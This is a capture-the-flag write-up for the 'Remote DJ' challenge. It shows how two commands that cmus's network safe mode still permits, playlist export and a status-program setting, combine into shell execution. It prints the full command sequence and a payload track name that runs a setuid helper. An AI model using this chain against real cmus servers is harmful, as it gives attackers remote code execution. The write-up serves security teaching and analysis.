# Remote DJ

**Category:** misc · **Points:** 95 · **Solves:** 74 · **Author:** sw1tchbl4d3

## Challenge

> You got the aux, well, a `cmus-remote` server and its password:
> `correct-horse-battery-staple`. You better play something good!

The handout (`remote-dj.zip`, password `correct-horse-battery-staple`) is a
Docker image definition for a music player with its remote-control socket
exposed, a setuid `/readflag` helper and a fake `/flag.txt`.

## TL;DR

cmus started with `--listen` runs remote clients in a "safe mode" that blocks
`run`, `shell`, `source`, `bind` and `save <file>` — but explicitly allows `save`
to *stdout*. Two commands that are still considered safe compose into code
execution: `pl-export` writes the playlist (i.e. attacker-chosen track names) to a
file, and `set status_display_program=/bin/sh` makes cmus spawn
`/bin/sh status <status text> <url> <track name> ...`, i.e. execute that file as a
shell script. A track named

```
http://127.0.0.1:9/; /readflag please give me the flag > /home/ctf/loot #
```

therefore runs `/readflag` and drops the flag into a readable file, which
`load -l` + `save -l -` then prints back over the same socket.

## Files

| file | description |
|---|---|
| `Dockerfile` | `ubuntu:latest` + `cmus`; user `ctf`; `/readflag` setuid root; `/flag.txt` 0400 root |
| `compose.yml` | builds the image, publishes `1024:1024`, network `internal: true` |
| `cmus/rc` | cmus configuration: `set passwd=correct-horse-battery-staple`, null audio output, `start_view=playlist`, resume on |
| `cmus/resume` | saved session so the first client already sees a playing track |
| `music/Banger1.flac`, `music/Banger2.flac` | filler so the playlist is not empty |
| `readflag.c`, `readflag` | setuid helper; requires exactly the five words `please give me the flag` |
| `flag.txt` | `flag{fake}` placeholder |

Tools: `ncat` (or `socat`/`openssl s_client` for the TLS-wrapped instance),
`python3` for the script, Docker + Docker Compose for the local build.

## Analysis

### The service

```
ENTRYPOINT ["script","-q","-e","-f","-c","cmus --listen 0.0.0.0:1024","/dev/null"]
USER ctf
WORKDIR /home/ctf
```

`script` gives cmus a pty (it is a curses program), `--listen` opens the remote
control socket, and the password from `rc` gates it. The protocol is plain text,
one command per line, exactly as typed in cmus' `:` prompt; the first line must be
`passwd <password>`. On the CTF platform the socket is TLS-wrapped
(`ncat --ssl <host> <port>`); the local compose build speaks plain TCP on
`localhost:1024`.

### Safe mode, and the one hole in it

`server.c`:

```c
run_only_safe_commands = addr.sa.sa_family != AF_UNIX;
```

Anything that arrives over TCP is a remote client. `command_mode.c` enforces it:

```c
if (run_only_safe_commands && (c->flags & CMD_UNSAFE)) {
        if (c->func != cmd_save || !is_stdout_filename(arg)) {
                d_print("trying to execute unsafe command over net\n");
                break;
        }
}
```

`run`, `shell`, `source`, `bind`, `w`, `win-remove` and `save` are flagged
`CMD_UNSAFE`, so `shell sh -c ...` and writing a playlist to a chosen path are
refused. The one exception is `save` with a stdout spec (`-`, `-l -`, `-p -`).
`load`, `pl-export`, `set`, `add`, `player-pause` and `view` are not flagged at
all — `pl-export <file>` is a *write* primitive that survived because it was not
classified as dangerous, which is what makes the chain possible.

### Turning strings into tracks

`add -p <url>` normally probes the file to build a `track_info`, and anything
that is not decodable audio is dropped. `set skip_track_info=true` disables that:

```c
/* cache.c */
if (skip_track_info && !reload && !force) {
        ti = track_info_new(filename);   /* filename only, no I/O */
        ...
}
```

With it enabled, cmus happily stores an arbitrary string as a track. Without it,
the payload URL is rejected before it ever reaches the playlist.

### From playlist to shell

`pl-export` (only valid in view 3, the playlist view — the default here) calls
`pl_export_selected_pl(path)` → `cmus_save(pl_save_cb, path, pl_visible)`, and
`save_playlist_cb` writes each track's filename raw plus a newline. The exported
file is therefore a list of attacker-controlled strings.

Then the status display program. `ui_curses.c`:

```c
argv[i++] = xstrdup(status_display_program);
argv[i++] = xstrdup("status");
argv[i++] = xstrdup(status_text);
...
/* "url" or "file", then the track filename, tags, duration, position */
```

So with `status_display_program=/bin/sh` cmus executes

```
/bin/sh status <status text> url http://127.0.0.1:9/; /readflag ... #
```

`argv[1]` is the literal string `status`, which `/bin/sh` reads as a script file —
the exported playlist. The first token of the payload line
(`http://127.0.0.1:9/`) is run as a command name and fails; `;` then runs
`/readflag` with the five required words; the trailing `#` comments out the rest.

`spawn()` redirects the child's stdout and stderr to `/dev/null` and closes fds
3–29, so the flag cannot come back through the status pipe — it must be written to
a file first, which is what `> /home/ctf/loot` does.

### Why `/readflag` cannot be called directly

`readflag.c` requires `argc == 6` with `argv[1..5]` equal to `please`, `give`,
`me`, `the`, `flag`:

```c
if (argc != 6) { usage(); return 1; }
char* required[] = { "please", "give", "me", "the", "flag" };
for (int i = 0; i < 5; i++)
        if (strcmp(argv[i + 1], required[i]) != 0) { usage(); return 1; }
```

The status program is always invoked with `argv[1] == "status"` and an odd argc
(program + status + text + key/value pairs), so that condition can never hold
directly: the shell script is also the way around the argument check.

### Reading the flag back

`load -l <file>` loads a playlist into the *library* (`view_load` →
`cmus_add(..., FILE_TYPE_PL, JOB_TYPE_LIB, ...)`), and `save -l -` dumps the
library to the socket. Relative entries in a playlist are resolved against the
playlist's directory, so the single line `flag{...}` in `/home/ctf/loot` comes
back as an absolute path `/home/ctf/flag{...}`.

## Solution

### 1. Connect and authenticate

```bash
ncat --ssl <host> <port>
```

```
passwd correct-horse-battery-staple
```

For the local build: `docker compose up -d`, then `nc localhost 1024`.

### 2. Prepare a track that is a shell command

```
set skip_track_info=true
add -p http://127.0.0.1:9/; /readflag please give me the flag > /home/ctf/loot #
save -p -
```

The last line is a sanity check, and it is also part of the trick: it is the only
form of `save` that safe mode allows. observed (the playlist as stored, one track
per line):

```
/home/ctf/Music/Banger1.flac
http://127.0.0.1:9/; /readflag please give me the flag > /home/ctf/loot #
```

### 3. Export it as a script, then execute it with the status hook

```
pl-export status
set status_display_program=/bin/sh
player-pause
```

`pl-export status` writes the playlist to `./status` in cmus' working directory
(`/home/ctf`, owned by `ctf`). `player-pause` changes the player state, which
triggers the status program — and therefore `/bin/sh status ...` — once. That
produces no output on the socket (stdout is `/dev/null`), but `/home/ctf/loot`
now contains the flag.

### 4. Read the loot file back

```
load -l /home/ctf/loot
save -l -
```

The load is asynchronous (cmus' worker thread), so wait a second before `save`.
observed on the socket:

```
/home/ctf/flag{0hhhh,_th4t5_why_th3y_call_th1s_1ns3cure!!!}
```

### 5. Or run the whole thing

```bash
python3 solve.py <host> <port>          # TLS instance
python3 solve.py localhost 1024 --plain # docker compose build
```

## Flag

```
flag{0hhhh,_th4t5_why_th3y_call_th1s_1ns3cure!!!}
```

## Notes

- `skip_track_info=true` is mandatory. Without it the `add` is silently dropped:
  cmus probes audio metadata, fails, and the playlist never gets the line.
- `pl-export` only works in the playlist view. The shipped `rc` sets
  `start_view=playlist`, so it works out of the box; if it answers
  `:pl-export only works in view 3`, send `view 3` first (also a safe command).
- The load/save pair at the end must be separated by a pause: `load` schedules a
  job, and an immediate `save -l -` prints the library as it was before the load.
- Do not `quit` between steps — that terminates the container. The connection can
  stay open for the whole chain.
- The setuid bit on `/readflag` is the privilege boundary; `/flag.txt` is
  `0400 root`, so only the helper can read it. The `argc == 6` check is a weak
  anti-automation guard that merely forces the payload through a shell.
- Root cause: a denylist. Two safe-listed primitives (write a file with attacker
  content, spawn a program whose `argv[1]` is that file) compose into arbitrary
  execution — letting the network set `status_display_program` is equivalent to
  allowing `shell`.
